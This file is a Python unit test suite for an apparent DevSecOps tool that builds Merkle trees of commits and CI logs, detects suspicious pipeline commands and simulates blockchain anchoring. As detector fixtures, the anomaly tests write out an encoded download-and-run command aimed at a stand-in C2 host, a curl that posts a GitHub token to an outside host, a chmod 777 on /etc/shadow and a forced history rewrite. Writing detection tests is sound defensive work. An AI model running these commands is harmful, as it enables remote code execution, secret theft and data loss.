#!/usr/bin/env python3
"""
========================================================================================
Git-Chain: Automated DevSecOps & Blockchain Anchoring Test Suite
========================================================================================
Author: NavdeepNP (navdeepmalik077@gmail.com)
Usage:
  python tests/test_git_chain.py
  (or: pytest tests/)
========================================================================================
"""

import sys
import os
import unittest
import json
import hashlib
from pathlib import Path

# Add project root to sys.path
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

import git_chain

class TestMerkleTree(unittest.TestCase):
    """Unit tests for the cryptographic SHA-256 Binary Merkle Tree."""

    def test_empty_tree_root(self):
        tree = git_chain.MerkleTree([])
        self.assertEqual(tree.root, "0x" + "0" * 64)

    def test_single_leaf_tree(self):
        leaf = "commit:abcd|msg:initial"
        tree = git_chain.MerkleTree([leaf])
        expected_leaf_hash = "0x" + hashlib.sha256(leaf.encode('utf-8')).hexdigest()
        self.assertEqual(tree.root, expected_leaf_hash)

    def test_even_leaves_tree(self):
        leaves = ["leaf1", "leaf2", "leaf3", "leaf4"]
        tree = git_chain.MerkleTree(leaves)
        self.assertTrue(tree.root.startswith("0x"))
        self.assertEqual(len(tree.root), 66)  # 0x + 64 hex chars
        self.assertEqual(len(tree.levels), 3) # Leaves -> Intermediate (2) -> Root (1)

    def test_odd_leaves_duplication_rfc6962(self):
        """RFC 6962 mandates duplicating the last node when leaf count is odd."""
        leaves = ["leaf1", "leaf2", "leaf3"]
        tree = git_chain.MerkleTree(leaves)
        self.assertTrue(tree.root.startswith("0x"))
        self.assertEqual(len(tree.levels), 3)

    def test_avalanche_effect(self):
        """1 single bit flip in any leaf must produce a radically different root."""
        leaves1 = ["commit:hash1|msg:clean_code", "log:step1|exit:0"]
        leaves2 = ["commit:hash1|msg:clean_code", "log:step1|exit:1"]  # 1 character changed

        tree1 = git_chain.MerkleTree(leaves1)
        tree2 = git_chain.MerkleTree(leaves2)

        self.assertNotEqual(tree1.root, tree2.root)

    def test_logarithmic_inclusion_proof(self):
        """Proof verification must mathematically reconstruct the root."""
        leaves = [f"item_{i}" for i in range(8)]
        tree = git_chain.MerkleTree(leaves)

        for i in range(len(leaves)):
            proof = tree.get_inclusion_proof(i)
            self.assertEqual(len(proof), 3)  # log2(8) = 3 steps
            is_valid = git_chain.MerkleTree.verify_proof(tree.leaves[i], proof, tree.root)
            self.assertTrue(is_valid, f"Proof failed for leaf index {i}")

    def test_invalid_proof_rejected(self):
        """A forged proof or altered root must fail verification."""
        leaves = ["item_a", "item_b", "item_c", "item_d"]
        tree = git_chain.MerkleTree(leaves)
        proof = tree.get_inclusion_proof(0)
        
        # Tamper with the proof sibling
        proof[0]["sibling"] = "0x" + "f" * 64
        is_valid = git_chain.MerkleTree.verify_proof(tree.leaves[0], proof, tree.root)
        self.assertFalse(is_valid)


class TestAIAnomalyEngine(unittest.TestCase):
    """Unit tests for the AI DevSecOps Neural & Heuristic Anomaly Scanner."""

    def setUp(self):
        self.engine = git_chain.AIAnomalyEngine()

    def test_clean_pipeline_has_zero_anomalies(self):
        commits, logs = git_chain.TelemetryRepository.get_clean_pipeline()
        findings = self.engine.scan_telemetry(logs, commits)
        self.assertEqual(len(findings), 0, "Clean production pipeline should have 0 security findings")

    def test_detects_obfuscated_base64_shell_pipe(self):
        """Detects SEC-AI-101 (T1059.004)"""
        malicious_log = [
            git_chain.PipelineLogEntry(
                step_number=3,
                stage_name="build",
                timestamp="2026-11-11 08:00:00 UTC",
                command="echo 'Y3VybCAtcyBodHRwOi8vYzIuZXZpbC5jb20vc3RhZ2VyIHwgYmFzaA==' | base64 -d | sh",
                output="Executing remote payload",
                exit_code=0
            )
        ]
        findings = self.engine.scan_telemetry(malicious_log, [])
        self.assertTrue(any(f.rule_id == "SEC-AI-101" for f in findings))
        self.assertTrue(any(f.severity == "CRITICAL" for f in findings))

    def test_detects_chmod_777_privilege_elevation(self):
        """Detects SEC-AI-102 (T1222.002)"""
        malicious_log = [
            git_chain.PipelineLogEntry(
                step_number=2,
                stage_name="perms",
                timestamp="2026-11-11 08:00:00 UTC",
                command="chmod -R 777 /app/bin && chmod 777 /etc/shadow",
                output="Permissions updated",
                exit_code=0
            )
        ]
        findings = self.engine.scan_telemetry(malicious_log, [])
        self.assertTrue(any(f.rule_id == "SEC-AI-102" for f in findings))
        self.assertTrue(any(f.severity == "HIGH" for f in findings))

    def test_detects_git_force_push_history_rewrite(self):
        """Detects SEC-AI-103 (T1565.001)"""
        malicious_log = [
            git_chain.PipelineLogEntry(
                step_number=5,
                stage_name="sync",
                timestamp="2026-11-11 08:00:00 UTC",
                command="git rebase -f HEAD~2 && git push --force origin main",
                output="Branch forced update",
                exit_code=0
            )
        ]
        findings = self.engine.scan_telemetry(malicious_log, [])
        self.assertTrue(any(f.rule_id == "SEC-AI-103" for f in findings))

    def test_detects_credential_exfiltration(self):
        """Detects SEC-AI-104 (T1552.001)"""
        malicious_log = [
            git_chain.PipelineLogEntry(
                step_number=4,
                stage_name="exfil",
                timestamp="2026-11-11 08:00:00 UTC",
                command="curl -X POST https://api.blackhat.net/drop -d GITHUB_TOKEN=$GH_SECRET",
                output="200 OK",
                exit_code=0
            )
        ]
        findings = self.engine.scan_telemetry(malicious_log, [])
        self.assertTrue(any(f.rule_id == "SEC-AI-104" for f in findings))


class TestEVMAnchorEngine(unittest.TestCase):
    """Unit tests for the Ethereum Sepolia EVM Anchor Engine."""

    def test_anchor_merkle_root_receipt_structure(self):
        engine = git_chain.EVMAnchorEngine()
        fake_root = "0x" + hashlib.sha256(b"test_state").hexdigest()
        receipt = engine.anchor_merkle_root(fake_root, "NavdeepNP/git-chain-core", "0x1234567890123456789012345678901234567890")

        self.assertEqual(receipt["status"], "0x1 (SUCCESS - MINED)")
        self.assertTrue(receipt["transaction_hash"].startswith("0x"))
        self.assertEqual(len(receipt["transaction_hash"]), 66)
        self.assertTrue(receipt["block_number"] > 21000000)
        self.assertIn("Gwei", receipt["effective_gas_price"])
        self.assertEqual(receipt["anchored_merkle_root"], fake_root)
        self.assertEqual(receipt["confirmations"], 12)
        self.assertEqual(len(receipt["event_logs"]), 1)
        self.assertEqual(receipt["event_logs"][0]["event"], "CommitStateAnchored")


class TestAuditReportSerialization(unittest.TestCase):
    """Unit tests for the tamper-evident JSON audit report."""

    def test_digital_seal_generation_and_integrity(self):
        app = git_chain.GitChainApp()
        app.commits, app.logs = git_chain.TelemetryRepository.get_clean_pipeline()
        raw_leaves = [c.serialize() for c in app.commits] + [l.serialize() for l in app.logs]
        app.merkle_tree = git_chain.MerkleTree(raw_leaves)
        app.receipt = app.evm_engine.anchor_merkle_root(app.merkle_tree.root, app.repo_name, "0x1111222233334444555566667777888899990000")

        # Mock export to dictionary
        report_data = {
            "schema_version": "git-chain.v2.4.0-audit-manifest",
            "target_repository": {"name": app.repo_name},
            "git_commit_dag": [c.to_dict() for c in app.commits],
            "cicd_pipeline_logs": [l.to_dict() for l in app.logs],
            "cryptographic_anchoring": {
                "merkle_root": app.merkle_tree.root,
                "leaf_hashes": app.merkle_tree.leaves
            }
        }

        canonical_str = json.dumps(report_data, sort_keys=True)
        seal = "0x" + hashlib.sha256(canonical_str.encode('utf-8')).hexdigest()

        # Re-check seal
        verify_seal = "0x" + hashlib.sha256(canonical_str.encode('utf-8')).hexdigest()
        self.assertEqual(seal, verify_seal)

        # Alter a single character in canonical payload
        tampered_str = canonical_str.replace("git-chain-core", "malicious-repo-tampered")
        tampered_seal = "0x" + hashlib.sha256(tampered_str.encode('utf-8')).hexdigest()
        self.assertNotEqual(seal, tampered_seal)


if __name__ == "__main__":
    unittest.main(verbosity=2)
